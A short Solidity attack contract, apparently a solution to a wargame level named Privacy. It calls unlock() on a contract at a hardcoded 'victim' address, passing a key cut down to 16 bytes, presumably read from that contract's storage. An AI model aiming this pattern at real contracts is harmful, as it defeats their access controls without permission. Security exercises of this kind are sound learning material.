// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Privacy.sol";

contract PrivacyAttack{
    Privacy victim = Privacy(0x382be8DF8e796c2449734850f175951540c49c95);
    constructor()public{}

    function unlockData(bytes32 _key) public {
        victim.unlock(bytes16(_key));
    }
}